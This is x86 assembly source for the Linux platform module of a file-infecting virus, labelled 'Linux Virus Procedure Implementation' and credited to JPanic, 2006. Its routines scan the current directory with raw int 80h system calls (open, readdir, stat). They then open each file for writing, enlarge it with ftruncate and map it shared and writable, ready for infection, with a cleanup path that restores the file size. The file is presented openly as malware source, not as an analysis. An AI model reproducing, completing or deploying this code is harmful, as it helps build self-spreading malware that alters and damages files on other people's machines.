;= Linux Virus Procedure Implementation (c) 2006 JPanic ===================
;
; Provides Virus Operating System specific routines for Linux.
;
; PUBLICS:
;	Linux_Init()
;	Linux_FindFirst()
;	Linux_FindNext()
;	Linux_FindClose()
;	Linux_OpenFile()
;	Linux_Close()
;
; Most arguments are passed implicitly through the heap.
;
;= Directive Warez ========================================================
	
	.486	
	locals @@
	.model flat
	
include inc\linux.inc
include inc\short.inc
include vheap.ash


	_LINUXPROC_ASM	EQU 	TRUE
	
;= Code Warez =============================================================
        include codeseg.ash

;= Linux_FindFirst ========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_FindFirst
Linux_FindFirst		PROC

			call	@@SkipDirName
			 db	'.',0
		@@SkipDirName:			 
			pop	ebx			; const char *fname
			xor	ecx,ecx			; int flags
			push	L 5
			pop	eax
			cdq				; mode_t mode			
			int	80h			; - open(..)
			mov	dwo [Linux_Heap.dwDirHandle],eax
	$LinuxReadDir:			
			cdq
			inc	edx			; 0 on error, otherwise uint count
			jz	$ret_cf
			xchg	ebx,eax			; uint fd
			lea	ecx,[Linux_Heap.dirp]	; struct dirent *dirp
			push	L 89
			pop	eax
			int	80h			; - readdir(..)
			xchg	eax,ecx
			jecxz	$ret_cf
			lea	ebx,[Linux_Heap.dirp.dirent_name]  ; char *fname
			movzx	eax,wo [Linux_Heap.dirp.dirent_reclen]
			mov	by [ebx+eax+1],0
			push	L 106
			pop	eax
			lea	ecx,[Linux_Heap.statbuf]	; struct stat *buf
			int	80h				; - stat(..)			
			mov	ecx,dwo [Linux_Heap.statbuf.stat_size]

; Linux_Init just returns NC..
PUBLIC	Linux_Init
        Linux_Init	LABEL
	$ret_nc:	test	al,1
			org	$-1
	$ret_cf:	stc
	$ret:		ret
			

Linux_FindFirst		ENDP

;= Linux_FindNext =========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_FindNext
Linux_FindNext		PROC

			mov	eax,dwo [Linux_Heap.dwDirHandle]
			jmp	$LinuxReadDir
			
Linux_FindNext		ENDP

;= Linux_FindClose ========================================================
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_FindClose
Linux_FindClose		PROC

			mov	ebx,dwo [Linux_Heap.dwDirHandle]; int fd
			push	L 6
			pop	eax
			int	80h				; - close(..)
			ret
			
Linux_FindClose		ENDP

;= Linux_OpenFile =========================================================
;
; Outputs:
;	CF on error.
;	EAX = Mapped file on success.
;
;--------------------------------------------------------------------------
PUBLIC	Linux_OpenFile
Linux_OpenFile		PROC

			push	L 5
			pop	eax
			lea	ebx,[Linux_Heap.dirp.dirent_name]; const char *fname
			cdq					; mode_t mode			
			lea	ecx,[edx+2]			; int flags.)
			int     80h
                        mov	[vheap.dwFileHandle],eax
			cdq
			xchg	ebx,eax				; int fd
			inc	edx
			jz	$ret_cf
			; ftruncate(fd,filesize+0x2000)
                        mov     ecx,[vheap.dwFileSize]                        
                        xor     edx,edx
                        mov     dh,20h
                        add     ecx,edx
                        push    L 93                            ; ftruncate
                        pop     eax
                        int     80h
                        mov     dh,10h
                        or      eax,eax
                        jnz     $restore_close                        
			; mmap(NULL, FileSize+4k, rounded, PROT_READ+PROT_WRITE, MAP_SHARED, fd, 0)
			push	eax             ; offset - 0
			push	ebx             ; fd
			push	L MAP_SHARED    ; flags
			push	L PROT_READ+PROT_WRITE ; prot
			dec     edx
                        add     ecx,edx
                        not     edx
                        and     ecx,edx
                        push	ecx             ; length rounded
			push	eax             ; start - 0
			mov	ebx,esp
			mov	al,90
			int	80h		; - mmap(..)
			add	esp,(6 * 4)
			cmp	eax,-4096
			mov	[vheap.dwMappedFile],eax
			jae	$restore_size
			clc	
			ret
			
Linux_OpenFile		ENDP

;= Linux_CloseFile ========================================================
;
; Outputs:
;	None. (returns CF as it is used by Linux_OpenFile on error).
;
;--------------------------------------------------------------------------
PUBLIC	Linux_CloseFile
Linux_CloseFile		PROC

            
			; unmap dwMappedFile, dwFileSize+4096
                        push	L 91
			pop	eax
			mov	ebx,[vheap.dwMappedFile]	; void *start			
			xor     ecx,ecx
                        mov     ch,10h
                        add	ecx,dwo [vheap.dwFileSize]	; size_t length
			int	80h				; - munmap(..)
	$restore_size:	; ftruncate ebx=fd,ecx=dwFillesize
                        mov     ebx,[vheap.dwFileHandle]
                        mov     ecx,[vheap.dwFileSize]
                        push    L 93                            ; ftruncate
                        pop     eax
                        int     80h
	$restore_close:	mov	ebx,[vheap.dwFileHandle]	; int fd
			push	L 6
			pop	eax				; - close(..)
			stc
			ret
			
Linux_CloseFile		ENDP
		
;==========================================================================
                        ENDS
			END
;==========================================================================
